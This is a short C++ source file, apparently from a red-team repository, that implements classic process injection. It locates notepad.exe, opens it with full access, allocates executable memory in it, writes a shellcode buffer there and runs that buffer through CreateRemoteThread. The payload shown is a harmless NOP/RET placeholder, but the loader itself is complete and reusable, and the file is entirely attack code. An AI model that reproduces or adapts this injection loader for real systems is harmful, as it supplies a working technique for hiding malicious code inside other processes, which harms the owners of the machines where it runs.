// Filename: inject_createremotethread.cpp
// Purpose: Classic injection using CreateRemoteThread
// Author: Joas A Santos - https://github.com/CyberSecurityUP

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

DWORD GetPidByName(const wchar_t* procName) {
    PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    while (Process32Next(snapshot, &entry)) {
        if (wcscmp(entry.szExeFile, procName) == 0) {
            CloseHandle(snapshot);
            return entry.th32ProcessID;
        }
    }

    CloseHandle(snapshot);
    return 0;
}

int main() {
    const wchar_t* target = L"notepad.exe";
    BYTE shellcode[] = { 0x90, 0x90, 0xC3 }; // NOP NOP RET

    DWORD pid = GetPidByName(target);
    if (!pid) return 1;

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID remoteMem = VirtualAllocEx(hProc, 0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, remoteMem, shellcode, sizeof(shellcode), 0);
    CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)remoteMem, 0, 0, 0);

    CloseHandle(hProc);
    return 0;
}
